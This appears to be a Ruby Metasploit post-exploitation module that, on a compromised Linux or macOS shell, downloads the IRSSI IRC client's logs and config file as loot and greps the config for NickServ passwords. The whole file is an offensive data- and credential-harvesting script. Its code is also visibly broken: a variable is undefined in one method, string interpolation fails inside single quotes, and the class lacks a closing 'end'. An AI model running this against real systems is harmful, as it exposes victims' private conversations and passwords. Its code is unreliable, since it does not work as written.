##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File

	def initialize(info={})
		super(update_info(info,
			'Name'          => 'IRSSI Log & Config Gather',
			'Description'   => %q{
					This module works on multiple platforms and gathers config and log files for IRSSI IRC client.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'HenryHoggard'],
			'Platform'      => [ 'linux', 'osx', 'unix'],
			'SessionTypes'  => [ "shell" ],
			
		))

	end

  def run
      print_status "Attempting to enumrate logs..."
      @peer = "#{session.session_host}:#{session.session_port}"
      user = session.shell_command("whoami").chomp
      
      case session.platform
      
      when /unix|linux|bsd/
        path = "/home/#{user}/irclogs/"
      when /osx/
        path = "/Users/#{user}/irclogs/"
      else
        print_error "Unsupported platform #{session.platform}"
        return
      end
      
      get_logs(path)
      print_status "Attempting to gather config..."
      get_config()  
      
      
  end
  

  
  def get_logs(path)
    logs = cmd_exec("find #{path} -name '*.log'")
    irc_logs = []
    logs.split("\n").each do |l|
      print_status("#{@peer} - Downloading #{l}")
      content = cmd_exec("cat #{l}")
      name = ::File.basename(l)
      
      loot = store_loot('IRSSI_LOGS', 'text/plain', session, content, "#{@peer}_#{l}", "IRSSI Logs")
      print_good("#{@peer} - #{name} saved as #{loot}")
			
    end
    return irc_logs
  end
    
  def get_config()
    path = "/home/#{user}/.irssi/config"
    print_status("#{@peer} - Downloading config")
    content = cmd_exec("cat #{path}")
    loot = store_loot('IRSSI_CONFIG', 'text/plain', session, content, "#{@peer}_config", "IRSSI Config file")
    print_good("#{@peer} - Config saved as #{loot}")
    password = cmd_exec('cat #{path} | grep "autosendcmd = \"/msg nickserv identify"')
    
    if password.to_s != ''
      print_good("#{@peer} - Possible passwords found! /n #{password}")
    end

	

end
    
    